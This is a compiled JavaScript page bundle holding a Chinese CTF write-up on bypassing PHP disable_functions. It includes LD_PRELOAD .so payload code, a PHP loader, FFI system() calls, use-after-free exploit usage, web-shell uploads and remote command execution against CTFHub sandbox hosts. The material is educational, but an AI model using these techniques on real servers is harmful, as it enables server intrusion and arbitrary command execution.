(window.webpackJsonp=window.webpackJsonp||[]).push([[35],{788:function(s,a,e){"use strict";e.r(a);var n=e(103),t=Object(n.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"bypass-disable-function"}},[s._v("bypass disable_function "),e("a",{staticClass:"header-anchor",attrs:{href:"#bypass-disable-function"}},[s._v("#")])]),s._v(" "),e("p",[s._v("是 php 禁用的函数，在 phpinfo 中可以查看")]),s._v(" "),e("p",[s._v("例如禁用 system 函数就无法执行命令，然后我们可以用一下方法饶过他的限制")]),s._v(" "),e("p",[s._v("可用的函数有")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("dl\nputenv \nerror_reporting\nerror_log\nfile_put_contents\nfile_get_contents\nfopen\nfclose \nfwrite\ntempnam \nimap_open\nsymlink\ncurl_init\nfsockopen\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br")])]),e("p",[s._v("利用代码见：http://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions")]),s._v(" "),e("h2",{attrs:{id:"关于文件上传"}},[s._v("关于文件上传 "),e("a",{staticClass:"header-anchor",attrs:{href:"#关于文件上传"}},[s._v("#")])]),s._v(" "),e("p",[s._v("有些时候需要包含文件，但是又不能访问根目录，以及当前目录没有写权限")]),s._v(" "),e("p",[s._v("我们可以利用自包含的方式传递文件到 /tmp 然后用 var_dump(scandir('/tmp/')) 查看内容，php5 大多数版本可用")]),s._v(" "),e("p",[s._v("例如：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("curl -F file=@shellshock.php -X POST http://challenge-fc37b0a33351b3a2.sandbox.ctfhub.com:10080/backdoor/index.php?ant=include(%27index.php%27);\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("然后文件就会留在 /tmp 目录,直接包含即可")]),s._v(" "),e("h2",{attrs:{id:"ld-preload"}},[s._v("LD_PRELOAD "),e("a",{staticClass:"header-anchor",attrs:{href:"#ld-preload"}},[s._v("#")])]),s._v(" "),e("p",[s._v("需要用到的条件有")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Linux 操作系统\nputenv\nmail or error_log\n存在可写的目录, 需要上传 .so 文件\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[s._v("用蚁剑插件的话需要当前 shell 目录可写")]),s._v(" "),e("p",[s._v("然后会在当前目录下自动生成这个文件：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v(".antproxy.php\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("之后连接这个文件，密码不变，即可在虚拟终端执行命令")]),s._v(" "),e("p",[s._v("但如果当前目录不可写，可以上传文件至 /tmp，之后包含")]),s._v(" "),e("p",[s._v("首先需要生成 so 文件")]),s._v(" "),e("p",[s._v("test.c ( payload 可替换 )")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nvoid payload() {\n    system("/readflag > /tmp/test");\n}   \nint  geteuid() {\nif (getenv("LD_PRELOAD") == NULL) { return 0; }\n    unsetenv("LD_PRELOAD");\n    payload();\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br")])]),e("p",[s._v("执行命令")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("gcc -c -fPIC test.c -o test\ngcc --share test -o test.so\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("将 c 编译成 so 文件")]),s._v(" "),e("p",[s._v("之后上传 shell.php 和 test.so 至 /tmp")]),s._v(" "),e("p",[s._v("shell.php")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('<?php\n    putenv("LD_PRELOAD=/tmp/test.so");\n    error_log("test",1,"","");\n    mail("test@localhost","","","","");\n?>\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[s._v("之后包含该 shell.php 文件，即可实现命令执行，输出执行 /realflag 的结果到 /tmp/test")]),s._v(" "),e("h2",{attrs:{id:"apache-mod-cgi"}},[s._v("Apache Mod CGI "),e("a",{staticClass:"header-anchor",attrs:{href:"#apache-mod-cgi"}},[s._v("#")])]),s._v(" "),e("p",[s._v("需要的条件有")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Linux 操作系统\nApache + PHP (apache 使用 apache_mod_php)\nApache 开启了 cgi, rewrite\nWeb 目录给了 AllowOverride 权限\n网站目录可写\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[s._v("也就是说只要是 Apache + PHP 环境就可能存在这个漏洞")]),s._v(" "),e("p",[s._v("蚁剑插件需要 shell 目录可写，然后即可在虚拟终端执行命令")]),s._v(" "),e("p",[s._v("手动的话，就上传 .htaccess 和 shell.ant 文件到网站目录")]),s._v(" "),e("p",[s._v("然后更改 shell.ant 权限为 777")]),s._v(" "),e("p",[s._v("访问 shell.ant 执行命令")]),s._v(" "),e("h2",{attrs:{id:"php-fpm"}},[s._v("PHP-FPM "),e("a",{staticClass:"header-anchor",attrs:{href:"#php-fpm"}},[s._v("#")])]),s._v(" "),e("p",[s._v("简单来说就是访问 FPM 端口，通过 cgi 从而修改 php 文件设置，使已有 php 文件包含自己传入的命令")]),s._v(" "),e("p",[s._v("需要的条件有")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Linux 操作系统\nPHP-FPM\n存在可写的目录, 需要上传 .so 文件\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("通常端口是 9000 但有时也不固定")]),s._v(" "),e("p",[s._v("当 shell 目录可写的时候，使用蚁剑插件可以在当前目录生成一个 .antproxy.php 文件")]),s._v(" "),e("p",[s._v("然后连接这个文件，即可操作终端")]),s._v(" "),e("h2",{attrs:{id:"json-serializer-uaf"}},[s._v("Json Serializer UAF "),e("a",{staticClass:"header-anchor",attrs:{href:"#json-serializer-uaf"}},[s._v("#")])]),s._v(" "),e("p",[s._v("需要的条件有")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Linux 操作系统\nPHP 版本\n7.1.X \n7.2 < 7.2.19 \n7.3 < 7.3.6\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[s._v("蚁剑插件可直接打开虚拟终端执行命令")]),s._v(" "),e("p",[s._v("手动的话，需要上传文件，比如传到 /tmp 目录，然后包含一下，这里我用 curl 没有上传成功，使用了一个上传页面成功上传")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('<!DOCTYPE html>\n<html>\n<head>\n    <title></title>\n</head>\n<body>\n    <form action="http://challenge-777ab141ad3bd5be.sandbox.ctfhub.com:10080/?ant=include(%27index.php%27);" method="post" enctype="multipart/form-data">\n        <input type="file" name="file" />\n        <br>\n        <input type="submit" />\n</body>\n</html>\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br")])]),e("p",[s._v("然后包含一下")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("?ant=include('/tmp/phpMnoKON');&cmd=/readflag\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("使用 cmd 参数执行命令")]),s._v(" "),e("h2",{attrs:{id:"gc-uaf"}},[s._v("GC UAF "),e("a",{staticClass:"header-anchor",attrs:{href:"#gc-uaf"}},[s._v("#")])]),s._v(" "),e("p",[s._v("这个就有点强了，适用于目前 PHP7 绝大部分版本")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("- 7.0 - all versions to date\n- 7.1 - all versions to date\n- 7.2 - all versions to date\n- 7.3 - all versions to date\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[s._v("蚁剑插件可直接在虚拟终端执行命令，如果不成功，可以手动上传")]),s._v(" "),e("p",[s._v("上传文件至 /tmp 目录，然后包含，即可利用 cmd 参数执行命令")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("?ant=include('/tmp/exp.php');&cmd=/readflag\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("h2",{attrs:{id:"ffi"}},[s._v("FFI "),e("a",{staticClass:"header-anchor",attrs:{href:"#ffi"}},[s._v("#")])]),s._v(" "),e("p",[s._v("使用条件有")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Linux 操作系统\nPHP >= 7.4\n开启了 FFI 扩展且 ffi.enable=true\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("蚁剑插件可直接在虚拟终端执行命令")]),s._v(" "),e("p",[s._v("手动上传的话，上传 FFI_exp.php 到 /tmp 目录，修改 FFI_exp.php 中内容执行命令")]),s._v(" "),e("p",[s._v("FFI_exp.php：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('<?php\n    $ffi = FFI::cdef("int system(const char *command);");\n    $ffi->system("/readflag > /tmp/123");\n    echo file_get_contents("/tmp/123");\n    @unlink("/tmp/123");\n?>\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("p",[s._v("然后包含")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("?ant=include('/tmp/FFI_exp.php');\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("即可获得 flag")])])}),[],!1,null,null,null);a.default=t.exports}}]);